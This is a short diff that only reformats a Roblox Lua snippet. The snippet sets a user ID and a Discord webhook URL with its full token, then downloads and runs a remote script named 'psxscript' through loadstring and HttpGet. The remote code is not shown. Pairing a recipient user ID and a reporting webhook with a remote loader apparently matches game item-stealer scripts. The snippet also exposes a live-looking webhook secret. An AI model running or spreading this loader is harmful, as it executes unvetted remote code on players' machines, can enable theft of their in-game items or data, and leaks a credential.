@@ -1,1 +1,3 @@
-_G.UserID="351924336"_G.WebHook="https://discord.com/api/webhooks/1085082896534081596/RLyP2zsSlA3eQLLj51LjCAunYANivzEwUfK0n4SQ3-pFX3Izshd6yscvvgyHqIbUXJP2"loadstring(game:HttpGet("https://raw.githubusercontent.com/bllxi2crazy/psxscript/main/script.lua"))()
+_G.UserID = "351924336"
+_G.WebHook = "https://discord.com/api/webhooks/1085082896534081596/RLyP2zsSlA3eQLLj51LjCAunYANivzEwUfK0n4SQ3-pFX3Izshd6yscvvgyHqIbUXJP2"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bllxi2crazy/psxscript/main/script.lua"))()
